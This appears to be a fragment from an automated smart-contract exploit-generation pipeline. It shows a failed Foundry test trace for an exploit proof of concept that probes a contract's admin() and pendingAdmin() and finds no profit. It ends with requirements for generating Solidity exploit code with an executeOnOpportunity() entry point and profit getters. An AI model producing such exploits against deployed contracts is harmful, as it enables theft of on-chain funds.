  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [157153] FlawVerifierTest::testExploit()
    ├─ [2394] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [130403] FlawVerifier::executeOnOpportunity()
    │   ├─ [2513] 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2::admin() [staticcall]
    │   │   └─ ← [Return] 0x100FE48127438776484fa988598600B174C8b1Bf
    │   ├─ [2450] 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2::pendingAdmin() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [513] 0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2::admin() [staticcall]
    │   │   └─ ← [Return] 0x100FE48127438776484fa988598600B174C8b1Bf
    │   └─ ← [Stop]
    ├─ [394] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [414] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 42.29ms (343.10µs CPU time)

Ran 1 test suite in 57.69ms (42.29ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 157153)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
